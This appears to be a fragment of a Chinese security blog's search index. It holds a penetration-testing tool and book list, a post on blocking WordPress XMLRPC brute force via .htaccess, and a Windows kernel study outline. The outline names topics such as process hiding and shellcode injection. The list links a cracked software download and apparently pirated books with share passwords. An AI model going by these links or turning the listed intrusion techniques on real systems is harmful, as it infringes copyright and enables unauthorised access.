target="_blank" rel="nofollow">官网</a><br><a href="https://share.weiyun.com/5LDUkNW" target="_blank" rel="nofollow">破解版</a><br>密：gsqygf</td></tr><tr><td align="center">Arachni</td><td align="center">基于Ruby的Web漏洞扫描工具<br>算不上强大但有其特色，用于评估web应用程序的安全性<br>不仅能对基本的静态或CMS网站进行扫描，<br>还能识别大部分平台的指纹信息（硬盘序列号和网卡物理地址）</td><td align="center"><a href="http://www.arachni-scanner.com/" target="_blank" rel="nofollow">官网</a><br><a href="https://github.com/Arachni/arachni" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XSStrike</td><td align="center">基于python的XSS漏洞扫描和利用工具<br>它对参数进行模糊测试之后构建合适的payload，<br>然后对参数进行穷举匹配，大多数payload都是由作者精心构造。<br>其内置爬虫功能，能够检测并尝试绕过WAF，且误报率极低</td><td align="center"><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XssPy</td><td align="center">基于python的Web应用XSS漏洞智能扫描器<br>它不仅能检查主页或给定页面，还能够检查网站上的所有链接以及子域<br>微软、斯坦福、摩托罗拉、Informatica等很多大型企业机构都在用</td><td align="center"><a href="https://github.com/faizann24/XssPy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Wfuzz</td><td align="center">Web Fuzzer：Web应用程序评估审查工具<br>它可以对任何字段的HTTP请求中的数据进行模糊处理</td><td align="center"><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">OpenSCAP</td><td align="center">基于C/C++实现的SCAP协议开源框架<br>目的是为SCAP各个标准协议的使用者提供一套简单易用的接口</td><td align="center"><a href="http://www.open-scap.org/" target="_blank" rel="nofollow">官网</a><br><a href="http://www.scap.org.cn/" target="_blank" rel="nofollow">中文社区</a><br><a href="https://github.com/OpenSCAP/openscap" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Hackvertor</td><td align="center">黑客工具包<br>看看黑客们平时都在用什么工具</td><td align="center"><a href="https://hackvertor.co.uk/public" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SSL/TLS安全评估报告</td><td align="center">检查HTTPS网站的SSL证书安全性</td><td align="center"><a href="https://myssl.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">SecurityHeaders</td><td align="center">通过分析HTTP响应头，评估相关安全选项是否配置得当<br>可根据评估建议修改配置</td><td align="center"><a href="https://securityheaders.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">URL Fuzzer</td><td align="center">扫描Web服务器上的隐藏文件/目录是否存在敏感信息</td><td align="center"><a href="https://pentest-tools.com/website-vulnerability-scanning/discover-hidden-directories-and-files" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">MD5Online</td><td align="center">MD5解密：通过已知的Hash字典逆向爆破<br>（论MD5加salt的重要性）</td><td align="center"><a href="https://www.md5online.org/" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">truffleHog</td><td align="center">排查 Git 项目中是否包含可疑的敏感信息</td><td align="center"><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">BFG Repo-Cleaner</td><td align="center">移除 Git 库中的大文件或污点提交</td><td align="center"><a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="nofollow">官网</a><br><a href="https://help.github.com/articles/removing-sensitive-data-from-a-repository/" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">brakeman</td><td align="center">通过静态代码扫描发现代码里的SQL注入问题</td><td align="center"><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">gixy</td><td align="center">Nginx 配置文件静态分析器<br>防止安全配置错误，并自动进行缺陷检测</td><td align="center"><a href="https://github.com/yandex/gixy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">bleach</td><td align="center">HTML净化器<br>对HTML片段进行标签或属性过滤，预防XSS攻击</td><td align="center"><a href="https://github.com/ecto/bleach" target="_blank" rel="nofollow">Github</a><br><a href="https://pypi.org/project/bleach/" target="_blank" rel="nofollow">Python版</a><br><a href="http://htmlpurifier.org/" target="_blank" rel="nofollow">PHP版</a></td></tr><tr><td align="center">New PHP Snippet</td><td align="center">PHP在线运行环境</td><td align="center"><a href="https://glot.io/new/php" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">RequestBin</td><td align="center">临时 HTTP 服务器，用于收集 HTTP 请求，XSS 利器</td><td align="center"><a href="https://requestbin.fullcontact.com/" target="_blank" rel="nofollow">在线使用</a></td></tr></tbody></table><hr><h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><table><thead><tr><th align="center">参考书（Kali系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Penetration Testing with Kali Linux (pwk.1.0)</td><td align="center">Kali-Linux渗透测试学习指南<br>PwK官方文档v1.0.1 - 2014版</td><td align="center"><a href="https://share.weiyun.com/5Z23CiY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4vi4bw</td></tr><tr><td align="center">Instant Kali Linux</td><td align="center">2013<br>Kali快速入门指导</td><td align="center"><a href="https://share.weiyun.com/5ar7k9m" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ryxi47</td></tr><tr><td align="center">Basic Security Testing with Kali Linux</td><td align="center">2014<br>基于Kali的安全测试</td><td align="center"><a href="https://share.weiyun.com/5PrItbo" target="_blank" rel="nofollow">腾讯微云</a><br>密码：qw9ym8</td></tr><tr><td align="center">Hacking with Kali - <br>Practical Penetration Testing Techniques</td><td align="center">2014<br>渗透测试实践技术</td><td align="center"><a href="https://share.weiyun.com/55GnaFY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xk8a3z</td></tr><tr><td align="center">Kali Linux Cookbook</td><td align="center">2013<br>Kali指导手册</td><td align="center"><a href="https://share.weiyun.com/5sAQ8mB" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xhgjcd</td></tr><tr><td align="center">Kali Linux Social Engineering</td><td align="center">2013<br>基于Kali的社会工程</td><td align="center"><a href="https://share.weiyun.com/5eT0MG3" target="_blank" rel="nofollow">腾讯微云</a><br>密码：gs4xay</td></tr><tr><td align="center">Kali Linux：Assuring Security By Penetration Testing</td><td align="center">2014<br>通过渗透测试确保安全</td><td align="center"><a href="https://share.weiyun.com/5A6P3Ak" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6nrp2k</td></tr><tr><td align="center">Web Penetration Testing with Kali Linux</td><td align="center">2013<br>web应用渗透测试</td><td align="center"><a href="https://share.weiyun.com/5zhW9me" target="_blank" rel="nofollow">腾讯微云</a><br>密码：2cxp9c</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（Metasploit系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Metasploit渗透测试魔鬼训练营</td><td align="center">2013.国内中文原创<br>详细讲解了Metasploit渗透测试的<br>技术、方法和技巧，并提供实战的实验室环境</td><td align="center"><a href="https://share.weiyun.com/5zAbIeM" target="_blank" rel="nofollow">腾讯微云</a><br>密码：i9ihtu</td></tr><tr><td align="center">Metasploit The Penetration Tester's Guide</td><td align="center">2011<br>渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5bl1xRV" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6gurxk</td></tr><tr><td align="center">Metasploit Penetration Testing Cookbook</td><td align="center">Jun.2012<br>渗透测试指导手册</td><td align="center"><a href="https://share.weiyun.com/5KfMxPQ" target="_blank" rel="nofollow">腾讯微云</a><br>密码：r4q73x</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（BackTrack5系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Offensive Security - <br>Penetration Testing with BackTrack (Lab Guide)</td><td align="center">v3.2<br>渗透测试实验室指导手册</td><td align="center"><a href="https://share.weiyun.com/5XzmA5I" target="_blank" rel="nofollow">腾讯微云</a><br>密码：fj9sqt</td></tr><tr><td align="center">BackTrack 5 Wireless Penetration Testing Beginner's Guide</td><td align="center">无线网络渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5Ql8le1" target="_blank" rel="nofollow">腾讯微云</a><br>密码：pdeqfn</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（其他）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">影响力（中文版）</td><td align="center">社会工程学<br>人为什么犯贱？</td><td align="center"><a href="https://share.weiyun.com/5mcRzVn" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ssyf25</td></tr><tr><td align="center">欺骗的艺术（中文版）</td><td align="center">社会工程学<br>世界著名黑客传奇</td><td align="center"><a href="https://share.weiyun.com/5s0Wwqr" target="_blank" rel="nofollow">腾讯微云</a><br>密码：wtpih9</td></tr><tr><td align="center">Learning Nessus for Penetration Testing</td><td align="center">Jan.2014<br>基于Nessus的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5F4iVQ7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：dak9um</td></tr><tr><td align="center">PP.Penetration Testing with the Bash shell</td><td align="center">May.2014<br>基于Bash的渗透测试</td><td align="center"><a href="https://share.weiyun.com/59Ltlbj" target="_blank" rel="nofollow">腾讯微云</a><br>密码：7saehu</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">2011<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/50E2OGL" target="_blank" rel="nofollow">腾讯微云</a><br>密码：z9enyr</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">The 2nd Edition, 2013<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/5PKAJAU" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5nwjt3</td></tr><tr><td align="center">Advanced Penetration Testing For Highly-Secured <br>Environments The Ultimate Security Guide</td><td align="center">2012<br>终极指南：高安全环境的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5VoihK7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：3u3c9t</td></tr><tr><td align="center">Gray Hat Hacking</td><td align="center">The 2nd Edition<br>灰帽子黑客</td><td align="center"><a href="https://share.weiyun.com/5EwizdA" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4tvjgb</td></tr><tr><td align="center">Hacking - Firewalls And Networks <br>How To Hack Into Remote Computers</td><td align="center">防火墙突破：远程网络渗透</td><td align="center"><a href="https://share.weiyun.com/5CAc1BG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：k93xfx</td></tr><tr><td align="center">Hacking The Art Of Exploitation</td><td align="center">The 2nd Edition, 2018<br>漏洞利用的艺术</td><td align="center"><a href="https://share.weiyun.com/5FDCNeP" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5c5ee6</td></tr><tr><td align="center">Hacking Wireless Networks For Dummies</td><td align="center">2005<br>无线网络窃听</td><td align="center"><a href="https://share.weiyun.com/5f7y3QF" target="_blank" rel="nofollow">腾讯微云</a><br>密码：px7hgj</td></tr><tr><td align="center">Penetration Testing A Hands-On Introduction to Hacking</td><td align="center">2014<br>渗透测试实践指导</td><td align="center"><a href="https://share.weiyun.com/5Wbiij7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：996jfr</td></tr><tr><td align="center">Practical Hacking - Techniques and Countermeasures</td><td align="center">黑客实践的技术与对策</td><td align="center"><a href="https://share.weiyun.com/5ON5FQG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ne75b9</td></tr></tbody></table><hr><h2 id="相关文献推荐"><a href="#相关文献推荐" class="headerlink" title="相关文献推荐"></a>相关文献推荐</h2><p><strong>社会工程：</strong></p><ul><li>信息安全之社会工程学（<strong>需翻墙</strong>）：<a href="https://program-think.blogspot.com/2009/05/social-engineering-0-overview.html">常识扫盲</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-1-gather-information.html">信息收集</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-2-pretend.html">假冒身份</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-3-influence.html">施加影响</a></li><li><a href="https://blog.csdn.net/pongba/article/details/1662148">《影响力》——人为什么犯贱</a></li><li><a href="https://www.zhihu.com/question/26113526">有哪些「社会工程学」攻击手段？</a></li><li><a href="https://guanjia.qq.com/news/n4/201505/12_18.html">防范社会工程学攻击的技巧与姿势</a></li></ul><p><strong>场景案例：</strong></p><ul><li><a href="https://www.douban.com/note/624958066/">Penetration Testing with Kali (PWK) 课程和 Offensive Security Certified Professional (OSCP) 考试回顾</a></li><li><a href="https://zhuanlan.zhihu.com/p/24249045">XSS实战：我是如何拿下你的百度账号</a></li><li><a href="http://www.kali.org.cn/thread-27331-1-1.html?tdsourcetag=s_pcqq_aiomsg">如何构建自己的渗透测试环境</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/107">驱散前端安全梦魇——DOMXSS典型场景分析与修复指南</a></li><li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html">CSRF 攻击的应对之道</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html">DDOS 攻击的防范教程</a></li><li><a href="https://www.freebuf.com/column/138074.html">海量日志中，如何实时在线检测未知异常行为？看瀚思的序列异常算法</a></li><li><a href="https://xz.aliyun.com/t/2860">记一次在实战靶机中使用SearchSploit的总结</a></li><li><a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">Paypal 2FA Bypass（通过删掉HTTP请求参数绕过验证）</a></li><li><a href="http://www.antiy.com/response/Upatre.html">部分利用社工技巧的群发邮件样本关联分析</a></li></ul><p><strong>主机入侵：</strong></p><ul><li><a href="https://www.qa-knowhow.com/?p=4688">主机威胁入侵检测开源工具与规则</a></li><li><a href="https://blog.csdn.net/AlexTan_/article/details/52080171">OSSEC主要功能及原理+详细配置+日志文件分析</a></li><li><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-elk/index.html">集中式日志系统 ELK 协议栈详解</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/21">浅谈大型网络入侵检测建设</a></li></ul><p><strong>Linux提权：</strong></p><ul><li><a href="https://payatu.com/guide-linux-privilege-escalation/">A GUIDE TO LINUX PRIVILEGE ESCALATION</a></li><li><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/">Linux提权基础介绍</a>（是前一篇的译文）</li><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></li><li><a href="https://www.freebuf.com/articles/system/23993.html">史上最全Linux提权后获取敏感信息方法</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2512">初识linux提权</a></li><li><a href="http://www.4hou.com/technology/2422.html">渗透测试中的Linux提权</a></li><li><a href="https://www.freebuf.com/sectool/121847.html">Linux提权？这四个脚本可以帮助你</a></li><li><a href="https://www.freebuf.com/articles/system/129549.html">Linux提权：从入门到放弃</a></li></ul><p><strong>Windows提权：</strong></p><ul><li><a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a></li><li>Windows下的渗透测试之提权的基本套路<a href="https://www.anquanke.com/post/id/84852">[上]</a><a href="https://www.anquanke.com/post/id/84855">[下]</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2519">Windows提权笔记</a></li><li><a href="https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html">Privilege Escalation Windows</a></li><li><a href="http://www.4hou.com/system/10212.html">Windows 提权命令指南</a></li><li><a href="https://www.freebuf.com/vuls/87463.html">Windows提权的几种姿势</a></li><li><a href="http://www.secist.com/archives/1070.html">内网渗透之如何玩转Meterpreter？</a></li><li><a href="https://www.freebuf.com/articles/system/184289.html">Windows内核漏洞利用提权教程</a></li><li><a href="https://xz.aliyun.com/t/203">Metasploit、Powershell之AlwaysInstallElevated提权实战</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-2227.html">metasploit 渗透测试笔记(meterpreter篇)</a></li></ul><p><strong>WebShell：</strong></p><ul><li><a href="https://www.jianshu.com/p/02aac12e459f">webshell原理</a></li><li><a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/">bash反弹shell原理解析</a></li><li><a href="https://www.wxwenku.com/d/244863">基于机器学习的web异常检测</a></li><li><a href="https://www.freebuf.com/articles/rookie/190953.html">机器学习入门之像使用Print一样使用算法检测WebShell</a></li><li><a href="https://sec.ctrip.com/doc/%E6%B6%82%E5%AE%8F%E4%BC%9F-OSSEC%E4%B8%8Ewebshell%E7%9B%91%E6%8E%A7%E6%8E%A2%E7%B4%A2.pdf">OSSEC与webshell实时监控探索</a></li></ul><p><strong>HTTP相关：</strong></p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies</a></li><li><a href="https://github.com/jin5354/404forest/issues/54">HTTP 安全最佳实践</a></li><li><a href="http://cizixs.com/2016/12/12/restful-api-design-guide/">跟着 Github 学习 Restful HTTP API 设计</a></li></ul><p><strong>其他：</strong></p><ul><li><a href="https://wizardforcel.gitbooks.io/mst-sec-lecture-notes/content/">米斯特白帽培训讲义</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">知道创宇研发技能表v3.1</a></li><li><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/index.html">大学霸 Kali Linux 安全渗透教程</a></li><li><a href="https://www.freebuf.com/articles/database/68877.html">大数据安全分析漫谈</a></li><li><a href="https://www.freebuf.com/articles/network/124422.html">浅析ReDoS的原理与实践</a></li><li><a href="https://www.freebuf.com/articles/web/155209.html">最好用的开源Web漏扫工具梳理</a></li><li><a href="https://itextpdf.com/blog/how-completely-remove-file-git-repository">How to completely remove a file from a Git repository</a></li><li><a href="http://mannix.top/2018/11/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/">渗透测试常用工具集合</a></li></ul><hr><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="https://share.weiyun.com/5eRmvxa">腾讯微云（密码：mpgksn）</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 白帽子 </tag>
            
            <tag> Pwk </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录</title>
      <link href="/website/jin-yong-xmlrpc-bi-mian-ddos/"/>
      <url>/website/jin-yong-xmlrpc-bi-mian-ddos/</url>
      
        <content type="html"><![CDATA[<h2 id="诱因"><a href="#诱因" class="headerlink" title="诱因"></a>诱因</h2><p>自从使用 Wordpress 建站以来，就一直被机器人暴力爆破登录密码，其规模已经足以引起DDos攻击，导致服务器启动没多久，资源就被耗尽，打开极其缓慢。</p><p>即使安装 Limit Login Attempts 插件进行登录限制，依然会被机器人用 IP 池持续攻击，成效甚微：</p><p><img src="./01.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从 Limit Login Attempts 插件的限制日志可以发现， 通过 XMLRPC 登录的次数远远大于通过 WP Login 登录的次数。</p><p>WP Login 就是通过 http://${site-url}/wp-login.php 直接登录， Limit Login Attempts 插件会加上校验码，使其不容易被爆破。</p><p>而 XMLRPC 的全称是 XML Remote Procedure Call，即 XML远程方法调用。它是 XHR （即 XMLHttpRequest）的一种实现，其交互消息都是基于 HTTP-POST 请求，请求的内容是 XML，服务端的返回结果同样也是 XML。</p><p>对于爬虫机器人而言，相对于 WP Login 方式，使用 XMLRPC 会更方便。因为前者更接近仿真方式登录，而后者则是纯脚本交互，而且可以绕过 Limit Login Attempts 等插件对登录页面的保护。</p><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><p>知道根源，处理就很简单了。因为作为站长，一般是用不到 XMLRPC 去管理自己站点的，所以禁用它即可。</p><p>而禁用的方法有很多，最简单直接的方法，就是修改网站后台根目录的 <code>.htaccess</code> 文件，在末尾加上这段内容即可：</p><pre class="line-numbers language-xml"><code class="language-xml"># forbit xmlrpc.php request (crawler, ddos, ...)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Files</span> <span class="token attr-name">xmlrpc.php</span><span class="token punctuation">></span></span>order deny,allowdeny from all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Files</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> XMLRPC </tag>
            
            <tag> DDOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WINDOWS 内核学习顺序指引清单</title>
      <link href="/re/windows-nei-he-xue-xi-qing-dan/"/>
      <url>/re/windows-nei-he-xue-xi-qing-dan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鉴于很多同学想学习 <font color="red"><strong>逆向工程</strong></font>，但是找不到切入点导致无从入手，因此编写了这个指引清单。</p><p>本文原则上只是一个<font color="red">学习指引目录</font>（虽然部分章节有提供一些资料），因涉及知识面太多，具体内容以后再逐渐填充。</p><p>有兴趣的同学可根据指引清单，先行逐步扩展学习每个知识点。当整个清单都弄懂了，也就入门了（<strong>对的，你没看错，只是入门</strong>）。</p><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-1-驱动框架（NT和WDM）"><a href="#1-1-驱动框架（NT和WDM）" class="headerlink" title="1.1. 驱动框架（NT和WDM）"></a>1.1. 驱动框架（NT和WDM）</h3><ul><li>《<a href=" http://blog.csdn.net/msk10k/article/details/51226666" target="_blank" rel="nofollow">NT - WDM - WDF 驱动概念</a>》</li></ul><h3 id="1-2-驱动基础（编程概念、内核函数、基本数据结构等等）"><a href="#1-2-驱动基础（编程概念、内核函数、基本数据结构等等）" class="headerlink" title="1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）"></a>1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）</h3><ul><li>《<a href="http://blog.csdn.net/erin45/article/details/7401678" target="_blank" rel="nofollow">WDM驱动程序的基本结构和实例</a>》</li><li>《<a href="http://blog.csdn.net/huangxy10/article/details/15307061" target="_blank" rel="nofollow">Windows驱动开发常用的数据结构</a>》</li><li>《<a href="http://blog.csdn.net/baggiowangyu/article/details/7936414" target="_blank" rel="nofollow">内存管理</a>》</li><li>《<a href="http://blog.csdn.net/whw8007/article/details/8865231" target="_blank" rel="nofollow">CE驱动开发常用宏定义</a>》</li><li>《<a href="http://blog.csdn.net/chenlycly/article/details/52777707" target="_blank" rel="nofollow">windows 内核函数前缀解析</a>》</li><li>《<a href="http://blog.csdn.net/lanuage/article/details/53413391" target="_blank" rel="nofollow">Windows常用内核函数</a>》</li></ul><h3 id="1-3-驱动通信（R3主动与R0通信、R0主动与R3交互）"><a href="#1-3-驱动通信（R3主动与R0通信、R0主动与R3交互）" class="headerlink" title="1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）"></a>1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）</h3><ul><li>R3：用户层</li><li>R0：内核层</li><li>《<a href="http://www.cnblogs.com/pcajax/archive/2011/03/16/1986407.html" target="_blank" rel="nofollow">ring0和ring3的区别</a>》</li></ul><h3 id="1-4-基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）"><a href="#1-4-基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）" class="headerlink" title="1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）"></a>1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）</h3><p>……</p><h2 id="2-进程相关"><a href="#2-进程相关" class="headerlink" title="2. 进程相关"></a>2. 进程相关</h2><h3 id="2-1-枚举进程（PID、EPROCESS、进程路径等）"><a href="#2-1-枚举进程（PID、EPROCESS、进程路径等）" class="headerlink" title="2.1. 枚举进程（PID、EPROCESS、进程路径等）"></a>2.1. 枚举进程（PID、EPROCESS、进程路径等）</h3><ul><li>《<a href="http://blog.csdn.net/yangluoning/article/details/14647969" target="_blank" rel="nofollow">四种方法实现VC枚举系统当前进程</a>》</li><li>《<a href="http://blog.csdn.net/zhongbin104/article/details/7867309" target="_blank" rel="nofollow">C++枚举进程的方法</a>》</li><li>《<a href="http://blog.csdn.net/myjisgreat/article/details/46481497" target="_blank" rel="nofollow">IsWow64Process函数理解的偏差</a>》</li></ul><h3 id="2-2-结束进程（多种方法）"><a href="#2-2-结束进程（多种方法）" class="headerlink" title="2.2. 结束进程（多种方法）"></a>2.2. 结束进程（多种方法）</h3><p>……</p><h3 id="2-3-挂起进程"><a href="#2-3-挂起进程" class="headerlink" title="2.3. 挂起进程"></a>2.3. 挂起进程</h3><p>……</p><h3 id="2-4-恢复进程"><a href="#2-4-恢复进程" class="headerlink" title="2.4. 恢复进程"></a>2.4. 恢复进程</h3><p>……</p><h3 id="2-5-保护进程（API-HOOK、回调）"><a href="#2-5-保护进程（API-HOOK、回调）" class="headerlink" title="2.5. 保护进程（API HOOK、回调）"></a>2.5. 保护进程（API HOOK、回调）</h3><p>……</p><h3 id="2-6-隐藏进程（API-HOOK、DKOM）"><a href="#2-6-隐藏进程（API-HOOK、DKOM）" class="headerlink" title="2.6. 隐藏进程（API HOOK、DKOM）"></a>2.6. 隐藏进程（API HOOK、DKOM）</h3><p>……</p><h3 id="2-7-枚举线程"><a href="#2-7-枚举线程" class="headerlink" title="2.7. 枚举线程"></a>2.7. 枚举线程</h3><p>……</p><h3 id="2-8-结束线程（多种方法）"><a href="#2-8-结束线程（多种方法）" class="headerlink" title="2.8. 结束线程（多种方法）"></a>2.8. 结束线程（多种方法）</h3><p>……</p><h3 id="2-9-挂起线程"><a href="#2-9-挂起线程" class="headerlink" title="2.9. 挂起线程"></a>2.9. 挂起线程</h3><p>……</p><h3 id="2-10-恢复线程"><a href="#2-10-恢复线程" class="headerlink" title="2.10. 恢复线程"></a>2.10. 恢复线程</h3><p>……</p><h3 id="2-11-枚举DLL（多种方法）"><a href="#2-11-枚举DLL（多种方法）" class="headerlink" title="2.11. 枚举DLL（多种方法）"></a>2.11. 枚举DLL（多种方法）</h3><p>……</p><h3 id="2-12-卸载DLL"><a href="#2-12-卸载DLL" class="headerlink" title="2.12. 卸载DLL"></a>2.12. 卸载DLL</h3><p>……</p><h3 id="2-13-注入DLL-SHELLCODE（NT6注入到系统进程）"><a href="#2-13-注入DLL-SHELLCODE（NT6注入到系统进程）" class="headerlink" title="2.13. 注入DLL/SHELLCODE（NT6注入到系统进程）"></a>2.13. 注入DLL/SHELLCODE（NT6注入到系统进程）</h3><p>……</p><h3 id="2-14-RING3-INLINE-HOOK-UNHOOK-绕过（多种方法）"><a href="#2-14-RING3-INLINE-HOOK-UNHOOK-绕过（多种方法）" class="headerlink" title="2.14. RING3 INLINE HOOK/UNHOOK/绕过（多种方法）"></a>2.14. RING3 INLINE HOOK/UNHOOK/绕过（多种方法）</h3><p>……</p><h3 id="2-15-RING3-EAT-HOOK-UNHOOK"><a href="#2-15-RING3-EAT-HOOK-UNHOOK" class="headerlink" title="2.15. RING3 EAT HOOK/UNHOOK"></a>2.15. RING3 EAT HOOK/UNHOOK</h3><p>……</p><h3 id="2-16-RING3-IAT-HOOK-UNHOOK"><a href="#2-16-RING3-IAT-HOOK-UNHOOK" class="headerlink" title="2.16. RING3 IAT HOOK/UNHOOK"></a>2.16. RING3 IAT HOOK/UNHOOK</h3><p>……</p><h3 id="2-17-窗口操作（枚举、发消息、隐藏-显示、启用-禁用等）"><a href="#2-17-窗口操作（枚举、发消息、隐藏-显示、启用-禁用等）" class="headerlink" title="2.17. 窗口操作（枚举、发消息、隐藏/显示、启用/禁用等）"></a>2.17. 窗口操作（枚举、发消息、隐藏/显示、启用/禁用等）</h3><p>……</p><h3 id="2-18-内存操作（枚举、申请、释放、读写、修改保护类型等）"><a href="#2-18-内存操作（枚举、申请、释放、读写、修改保护类型等）" class="headerlink" title="2.18. 内存操作（枚举、申请、释放、读写、修改保护类型等）"></a>2.18. 内存操作（枚举、申请、释放、读写、修改保护类型等）</h3><p>……</p><h3 id="2-19-消息钩子（枚举、删除）"><a href="#2-19-消息钩子（枚举、删除）" class="headerlink" title="2.19. 消息钩子（枚举、删除）"></a>2.19. 消息钩子（枚举、删除）</h3><p>……</p><h3 id="2-20-内核回调表（枚举、清除HOOK）"><a href="#2-20-内核回调表（枚举、清除HOOK）" 